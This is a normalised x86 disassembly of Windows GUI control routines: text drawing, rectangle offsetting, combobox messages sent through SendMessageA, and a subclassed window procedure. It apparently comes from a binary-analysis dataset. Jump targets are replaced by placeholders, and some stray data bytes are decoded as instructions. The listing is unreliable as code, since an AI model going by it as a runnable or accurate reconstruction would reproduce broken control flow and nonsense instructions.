call sub_424730
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43d2fc
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43d69e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_4247d4
call sub_43936c
call sub_43944c
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_424730
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_448af4
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_416cd4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_416cd4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x54 ]
call sub_4042c8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x58 ]
call sub_4044c8
push eax
mov eax edi
call sub_4248b4
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_416cd4
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_423fb4
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_423fb4
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4243dc
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_423fb4
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_4248b4
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d6a5
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x60 ]
call sub_4046e8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_40402c
retn
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4243dc
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_448af4
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_424714
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_416cd4
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_416cd4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404834
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_4248b4
push eax
call sub_43936c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4395b4
jmp r-xdata
call sub_43936c
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_439618
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_4248b4
push eax
call sub_43936c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_439508
push 0x0
mov eax edi
call sub_4248b4
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_448af4
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44add4
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x80 ]
call sub_4042c8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x84 ]
call sub_4044c8
push eax
mov eax edi
call sub_4248b4
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_423fb4
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x88 ]
call sub_4042c8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x8c ]
call sub_4044c8
push eax
mov eax edi
call sub_4248b4
push eax
call DrawTextA
sub_43d6af
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d72a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45f800
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44e760
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
call sub_44f83c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d731
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43d77c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450524
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_4482b0
mov edx 0x11
mov eax esi
call sub_4482d4
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43936c
call sub_43944c
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43d828
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d97e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44add4
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4247d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042d0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x160 ]
call sub_4248b4
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4237e8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x160 ]
call sub_4248b4
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4237e8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x160 ]
call sub_4248b4
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d985
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_43d98f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43dbb8
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4240d0
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423fb4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_4240d0
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4243a0
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_40348c
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_40348c
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43dab0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_424934
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_40348c
xor edx edx
mov eax [ edi + 0x160 ]
call sub_424934
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_4458d4
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_43dbf4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43dbb8
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43dc54
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_40348c
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43dc7c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_447fc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_43dce0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43dd6d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dd74
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45f800
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43dde0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43de46
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43de4d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4196b4
sub_43de58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43de7c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404654
mov edx esi
xchg edx eax
call sub_404654
mov eax [ esi ]
call sub_4044c8
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ded4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43df38
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_448af4
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_448b24
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df3f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43df44
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43df64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044c8
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43df8c
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_449030
sub_43dfc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e033
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4044c8
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e03a
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
sub_43e044
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e0b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4044c8
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e0be
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
sub_43e0c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b008
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_4482b0
mov edx 0x19
mov eax ebx
call sub_4482d4
mov dl 0x1
mov eax ebx
call sub_44f510
xor edx edx
mov eax ebx
call sub_448cb8
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_4476d0
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_43e428
call sub_4217a4
mov [ ebx + 0x24c ] eax
push ebx
push sub_43e520
call sub_4217a4
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_43e1b8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_45f71c
mov eax [ esi + 0x24c ]
call sub_45f71c
mov eax [ esi + 0x208 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_43e23a
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44c6d0
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_43e284
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43e2a8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_44f2dc
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_43e2f0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_43e31c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
sub_43e368
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_44f2dc
push eax
call SetWindowTextA
sub_43e3a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43e284
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_43e3dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e8f4
pop esi
pop ebx
retn
mov eax ebx
call sub_44c87c
sub_43e400
push ebx
mov ebx eax
mov eax ebx
call sub_44a6cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43e428
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_45f870
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_448638
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b60
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44919c
jmp r-xdata
sub_43e540
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e7f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e130
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e218
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e284
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46901c
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_40348c
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f870
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d008
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e2e0
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
